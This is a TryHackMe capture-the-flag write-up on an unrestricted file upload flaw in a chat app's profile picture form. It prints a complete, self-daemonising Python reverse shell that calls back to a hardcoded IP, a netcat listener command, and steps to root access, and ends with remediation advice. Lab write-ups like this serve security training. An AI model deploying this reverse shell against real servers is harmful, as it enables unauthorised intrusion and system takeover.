# **Speed Chatting - TryHackMe Writeup**
## **Executive Summary**
- **Room Name:** Speed Chatting

- **Vulnerability Identified:** Insecure File Upload (Unrestricted File Upload)

- **Impact:** Remote Code Execution (RCE) / System Compromise

- **Tools Used:** Browser Developer Tools, Python, Netcat (`nc`)
## **Technical Overview**
The primary vulnerability present in the target application is **Insecure File Upload**. The profile picture update feature accepts user-supplied files without performing proper validation on file extensions, MIME types, or file content execution permissions. By leveraging this flaw, an attacker can upload an executable script (such as a Python reverse shell) to the server's web directory and trigger its execution to gain unauthorized shell access.
## **Detailed Walkthrough**
### **1. Source Code Inspection & Reconnaissance**
###  
The target application provides a user profile configuration panel. Inspecting the HTML source code via browser developer tools reveals the form structure responsible for processing avatar uploads:

**Observation:** The form uses an input field named `profile_pic`. Analysis indicates that validation is absent on both client and server sides, allowing arbitrary file formats to be transmitted to the server.
### **2. Identifying the Upload Functionality**
The web application interface contains an explicit feature for updating profile photos:

Because the application fails to restrict file uploads strictly to image types (such as `.png`, `.jpg`, or `.gif`), executable files can be transferred directly to the server filesystem. 
### **3. Exploitation (Remote Code Execution)**
To exploit this unrestricted upload vulnerability, a custom Python script (`rev.py`) was prepared to initiate a reverse socket connection back to the attacker's listener upon execution.
#### **Payload (**`rev.py`**):**
`import socket, subprocess, os, pty, sys, time`  `IP = "192.168.192.106"` `PORT = 4444`  `def connect_and_spawn():` `    while True:` `        try:` `            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)` `            s.connect((IP, PORT))` `            os.dup2(s.fileno(), 0)` `            os.dup2(s.fileno(), 1)` `            os.dup2(s.fileno(), 2)` `            pty.spawn("/bin/bash")` `            s.close()` `            break` `        except Exception:` `            time.sleep(3)` `            continue`  `try:` `    pid = os.fork()` `    if pid > 0:` `        sys.exit(0)` `except OSError:` `    sys.exit(1)`  `os.setsid()`  `try:` `    pid = os.fork()` `    if pid > 0:` `        sys.exit(0)` `except OSError:` `    sys.exit(1)`  `connect_and_spawn()`

 
### **4. Gaining Access & Flag Retrieval**
1. Start a Netcat listener on the attack machine listening on port `4444`:

`nc -lvnp 4444` 

1. Upload `rev.py` via the profile update form and trigger its execution on the server.

2. Receive the reverse interactive shell connection as the `root` user.

3. Navigate to `/opt/Speed_Chat` and retrieve the flag (`flag.txt`).

`THM{``********************************}`

## **Remediation & Countermeasures**
To mitigate this vulnerability, the application should implement the following security controls:

1. **Strict File Extension Validation:** Enforce a strict whitelist of allowed extensions (e.g., `.png`, `.jpeg`).

2. **Content / MIME-Type Inspection:** Validate file headers (magic bytes) to verify that uploaded files match their expected format.

3. **Randomized File Renaming:** Rename uploaded files using cryptographically secure hashes (e.g., `UUID`) to prevent direct path traversal or remote execution.

4. **Non-Executable Upload Storage:** Store user uploads in a directory configured with non-executable permissions (`noexec`).


